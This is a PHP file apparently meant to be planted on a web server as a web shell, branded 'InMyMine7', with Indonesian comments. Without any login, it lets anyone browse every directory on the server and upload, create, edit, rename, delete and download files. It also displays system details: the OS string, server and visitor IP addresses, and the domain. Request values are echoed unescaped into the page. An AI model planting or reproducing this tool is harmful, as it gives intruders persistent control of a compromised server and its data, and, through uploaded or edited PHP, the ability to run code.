<?php
// Set directory root menjadi public_html
$root_dir = realpath(__DIR__);  // Ini mengatur root menjadi folder di mana file PHP ini disimpan
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

// Periksa jika direktori yang diminta valid dan dapat diakses
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir; // Jika direktori tidak valid, kembali ke root_dir
}

// Fungsi untuk menampilkan list file & folder, dengan folder di atas dan file di bawah
function listDirectory($dir)
{
    $files = scandir($dir);

    // Array untuk menyimpan folder dan file terpisah
    $directories = [];
    $regular_files = [];

    // Pisahkan folder dan file ke dalam array yang berbeda
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;  // Masukkan ke array folder
            } else {
                $regular_files[] = $file; // Masukkan ke array file biasa
            }
        }
    }

    // Tampilkan folder di atas
    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    // Tampilkan file di bawah
    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk rename file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk membuat file baru
if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    // Buat file baru dengan konten kosong
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>InMyMine7</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
    background: url('https://i.pinimg.com/564x/55/e1/ca/55e1ca53651ff974e71953a1d92bf0cc.jpg') no-repeat center center;
    background-size: cover; /* Untuk menutupi area, mungkin terpotong */
    min-height: 100vh; /* Menjamin body setidaknya setinggi jendela tampilan */
    color: #E0E0E0;
    font-family: 'Fredericka the Great', sans-serif; 
    font-weight: 100;
    margin: 0;
}
h2 {
    color: #BB86FC;
}

table {
    width: 100%;
    border-collapse: collapse;
    background-color: rgba(34, 34, 34, 0.5); /* Ubah transparansi */
    /* backdrop-filter: blur(5px); Hapus atau sesuaikan jika perlu */
}

th, td {
    padding: 10px;
    text-align: left;
    background-color: rgba(34, 34, 34, 0.3); /* Ubah transparansi */
}

th {
    background-color: rgba(51, 51, 51, 0.5); /* Ubah transparansi */
    color: #BB86FC;
}

tr:nth-child(even) {
    background-color: rgba(34, 34, 34, 0.4); /* Ubah transparansi */
}

tr:nth-child(odd) {
    background-color: rgba(18, 18, 18, 0.4); /* Ubah transparansi */
}

a {
    color: #03DAC6;
    text-decoration: none;
}

a:hover {
    color: #BB86FC;
}

button {
    background-color: #03DAC6;
    color: #121212;
    border: none;
    padding: 10px 20px;
    cursor: pointer;
}

button:hover {
    background-color: #BB86FC;
}

textarea {
    width: 100%;
    height: 400px;
    background-color: rgba(34, 34, 34, 0.8); /* Ubah transparansi */
    color: #E0E0E0;
    border: 1px solid #BB86FC;
}

input[type="file"], input[type="text"] {
    color: #E0E0E0;
    background-color: rgba(34, 34, 34, 0.8); /* Ubah transparansi */
    border: 1px solid #BB86FC;
    padding: 10px;
}

.form-container {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
}

.center-title {
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0;
}

.form-container form {
    margin-right: 10px;
}
        .center-title {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }
        .form-container form {
            margin-right: 10px;
        }
        netepil {
      font-size: 25pt;
      text-shadow: 2px 1px 2px #9762d9;
      background: linear-gradient(200deg, #BB86FC 25%, #03DAC6 50%, #03DAC6 75%, #03DAC6 100%);
      background-size: 200% auto;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: animate 1.2s linear infinite; 
      }
    @keyframes animate{ to { background-position: 200% center;
    }
  }
    </style>
</head>
<body>
<div class="center-title">
    <p><netepil><code><b><i>InMyMine7</p></netepil>
</div>
<ul>
    <li>PHP: <a style="color: #03DAC6;"><?= php_uname(); ?></a></li>
    <li>Server: 
        <a style="color: #03DAC6;">
            <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?>
        </a>
    </li>
    <li>Domain: 
        <a style="color: #03DAC6;">
            <?= "{$_SERVER["SERVER_NAME"]}"; ?>
        </a>
    </li>
    <li>IP Server: 
        <a style="color: #03DAC6;">
            <?= getHostByName(getHostName()); ?>
        </a>
    </li>
</ul>

<p><p>
    Current Directory: 
    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;">
        <?php echo $current_dir; ?>
    </a>
</p>
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk rename file -->
    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php
    if (isset($_GET['edit'])):
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo $_GET['edit']; ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br>
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>